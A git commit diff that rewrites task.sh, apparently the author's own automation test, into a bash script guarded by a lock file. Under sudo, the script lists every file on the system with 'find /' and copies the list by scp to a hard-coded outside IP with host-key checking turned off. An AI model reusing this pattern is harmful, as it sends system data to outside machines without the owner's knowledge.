bfbb55239b79b685da11064f191358697f19222a
arellano-gustavo <arellano.gustavo@gmail.com>
2018-09-10 00:40:44 -0500

    Update task.sh
    done

--- task.sh
+++ task.sh
@@ -1,1 +1,13 @@
-echo "prueba de tiempo" >> /Users/automation/abc.txt
+#!/bin/bash
+
+FILE=wait.txt
+
+if [ -f $FILE ]; then
+    echo "File $FILE does exist. I will wait for it to disaper..." >> log.txt
+else
+    /usr/bin/sudo echo "File not found! Good !!!!" >> log.txt
+    /usr/bin/sudo touch wait.txt
+    /usr/bin/sudo /usr/bin/find / "*.*" > lista.txt
+    /usr/bin/sudo /usr/bin/scp -i inicial-pruebas.pem -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  lista.txt ubuntu@54.241.82.49:/home/ubuntu/
+    /usr/bin/sudo rm -rf wait.txt
+fi
